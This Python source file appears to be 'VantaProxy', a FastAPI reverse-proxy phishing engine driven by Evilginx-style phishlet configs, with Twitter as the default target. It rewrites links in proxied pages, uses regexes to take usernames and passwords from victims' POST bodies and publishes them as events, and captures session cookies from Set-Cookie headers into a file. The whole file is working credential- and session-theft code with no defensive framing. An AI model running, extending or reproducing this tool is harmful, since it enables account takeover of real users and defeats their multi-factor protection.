import yaml
from core.event_bus import publish_event
import re
from datetime import datetime
import httpx
import uvicorn
import logging
import os
from typing import Dict, Any, Optional, List
from fastapi import FastAPI, Request, Response

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("VantaProxy")

class PhishletEngine:
    def __init__(self, phishlet_path: str):
        self.phishlet_path = phishlet_path
        self.config = self._load_config()
        self.proxy_hosts = {h['phish_sub']: h for h in self.config.get('proxy_hosts', [])}
        self.sub_filters = self.config.get('sub_filters', [])
        self.credentials = self.config.get('credentials', {})
        self.auth_tokens = self.config.get('auth_tokens', [])
        self.landing_path = self.config.get('login', {}).get('path', '/')
        self.target_domain = self.config.get('login', {}).get('domain', '')
        self.name = self.config.get('name', 'Unknown')
        self.allowed_domains = self._load_allowed_domains()

    def _load_config(self) -> Dict[str, Any]:
        if not os.path.exists(self.phishlet_path):
            logger.error(f"Phishlet file not found: {self.phishlet_path}")
            return {}
        with open(self.phishlet_path, 'r') as f:
            return yaml.safe_load(f)

    def _load_allowed_domains(self) -> List[str]:
        wl_env = os.getenv("WHITELIST_DOMAINS", "")
        wl_cfg = self.config.get("allowed_domains", [])
        domains = set([d.strip().lower() for d in wl_cfg if isinstance(d, str)])
        if wl_env:
            for d in wl_env.split(","):
                domains.add(d.strip().lower())
        return sorted(list(domains))

    def get_target_url(self, subdomain: str, path: str) -> str:
        # Simplified logic: find the domain associated with the subdomain
        host_config = self.proxy_hosts.get(subdomain)
        if host_config:
            return f"https://{host_config['orig_sub']}.{host_config['domain']}{path}"
        # Fallback to main domain if not found (or if subdomain is empty/www)
        return f"https://{self.target_domain}{path}"

    def process_content(self, content: bytes, hostname: str, content_type: Optional[str] = None) -> bytes:
        try:
            decoded_content = content.decode('utf-8', errors='ignore')
            
            # Apply sub_filters (rewrite links)
            for filter_rule in self.sub_filters:
                search_pattern = filter_rule.get('search', '')
                replace_pattern = filter_rule.get('replace', '').replace('{hostname}', hostname)
                mimes: List[str] = filter_rule.get('mimes', [])
                if mimes and content_type:
                    allowed = any(mime in content_type for mime in mimes)
                    if not allowed:
                        continue
                if search_pattern:
                    decoded_content = decoded_content.replace(search_pattern, replace_pattern)
                
            return decoded_content.encode('utf-8')
        except Exception as e:
            logger.error(f"Error processing content: {e}")
            return content

    def capture_credentials(self, path: str, body: bytes, request_info: dict):
        try:
            decoded_body = body.decode('utf-8', errors='ignore')
            captured = {}
            
            for field, config in self.credentials.items():
                key = config.get('key')
                if not key: continue
                
                # Simple form data parsing
                if config.get('type') == 'post':
                    # Check if it's form-urlencoded
                    if key + '=' in decoded_body:
                        # Very basic extraction
                        match = re.search(f"{key}=([^&]*)", decoded_body)
                        if match:
                            captured[field] = match.group(1)
                    # Or JSON
                    elif f'\"{key}\"' in decoded_body:
                         match = re.search(f'\"{key}\"\s*:\s*\"([^\"]*)\"', decoded_body)
                         if match:
                             captured[field] = match.group(1)

            if captured:
                log_msg = f"\033[92m[+] CREDENTIALS CAPTURED for {self.name}! Publishing event...\033[0m"
                logger.info(log_msg)
                print(log_msg) # Ensure it prints to stdout
                
                # Publish event instead of writing to file
                event_data = {
                    "phishlet_name": self.name,
                    "path": path,
                    "captured_data": captured,
                    "request_info": request_info,
                    "timestamp": datetime.now().isoformat()
                }
                publish_event('credential_captured', event_data)

        except Exception as e:
            logger.error(f"Error capturing credentials: {e}")
    
    def capture_tokens_from_headers(self, path: str, headers: Dict[str, str]):
        try:
            # Handle both cases for header casing
            set_cookie = headers.get("set-cookie") or headers.get("Set-Cookie")
            if not set_cookie:
                return
            captured: Dict[str, str] = {}
            for token_cfg in self.auth_tokens:
                keys: List[str] = token_cfg.get("keys", [])
                for k in keys:
                    m = re.search(rf"{re.escape(k)}=([^;]+)", set_cookie)
                    if m:
                        captured[k] = m.group(1)
            if captured:
                log_msg = f"\033[96m[+] SESSION TOKENS CAPTURED for {self.name}!\033[0m\nTokens: {captured}"
                logger.info(log_msg)
                print(log_msg)
                with open("captured_sessions.txt", "a") as f:
                    f.write(f"[{self.name}] Path: {path} | Tokens: {captured}\n")
        except Exception as e:
            logger.error(f"Error capturing tokens: {e}")

app = FastAPI()
engine: Optional[PhishletEngine] = None

@app.on_event("startup")
async def startup_event():
    # Load phishlet path from environment
    phishlet_path = os.getenv("PHISHLET", "phishlets/twitter.yaml")
    
    # If it's just a name like 'twitter', append path structure
    if not phishlet_path.endswith('.yaml') and not os.path.exists(phishlet_path):
         phishlet_path = f"phishlets/{phishlet_path}.yaml"

    global engine
    if os.path.exists(phishlet_path):
        engine = PhishletEngine(phishlet_path)
        logger.info(f"Loaded phishlet engine for: {engine.name} (from {phishlet_path})")
    else:
        logger.error(f"Phishlet file not found: {phishlet_path}")
        # Initialize with dummy to avoid crashes, but it won't work well
        engine = None

@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"])
async def proxy(request: Request, path: str):
    if not engine:
        return Response("Engine not initialized", status_code=500)

    # Determine subdomain from Host header
    host = request.url.hostname or ""
    phish_sub = host.split(".")[0] if host else "www"
    target_url = engine.get_target_url(phish_sub, f"/{path}")
    # Enforce domain whitelist
    try:
        # Extract domain from target_url (strip scheme and sub)
        domain_part = target_url.split("://", 1)[-1].split("/")[0]
        base_domain = ".".join(domain_part.split(".")[-2:]).lower()
        if engine.allowed_domains and base_domain not in engine.allowed_domains:
            logger.warning(f"Blocked target domain {base_domain} not in whitelist: {engine.allowed_domains}")
            return Response("Forbidden: domain not allowed", status_code=403)
    except Exception:
        pass
    
    logger.info(f"Proxying {request.method} /{path} -> {target_url}")

    async with httpx.AsyncClient(follow_redirects=False, verify=False) as client:
        # Forward request
        req_headers = dict(request.headers)
        req_headers.pop('host', None) # Let httpx set the host
        
        req_body = await request.body()
        
        # Check for credential capture on POST
        if request.method == "POST":
            request_info = {
                "client_ip": request.client.host,
                "user_agent": request.headers.get("user-agent", "Unknown"),
                "hostname": request.url.hostname or "localhost"
            }
            engine.capture_credentials(f"/{path}", req_body, request_info)

        try:
            proxy_resp = await client.request(
                request.method, 
                target_url, 
                headers=req_headers, 
                content=req_body,
                cookies=request.cookies
            )
        except Exception as e:
            logger.error(f"Proxy error: {e}")
            return Response(f"Proxy Error: {str(e)}", status_code=502)

        # Process response content
        content_type = proxy_resp.headers.get("content-type", "")
        content = engine.process_content(proxy_resp.content, request.url.hostname or "localhost", content_type=content_type)
        
        # Capture session tokens from Set-Cookie
        engine.capture_tokens_from_headers(f"/{path}", dict(proxy_resp.headers))
        
        # Create response
        response = Response(
            content=content,
            status_code=proxy_resp.status_code,
            headers=dict(proxy_resp.headers)
        )
        
        return response

if __name__ == "__main__":
    import uvloop
    uvloop.install()
    uvicorn.run(app, host="0.0.0.0", port=8080)
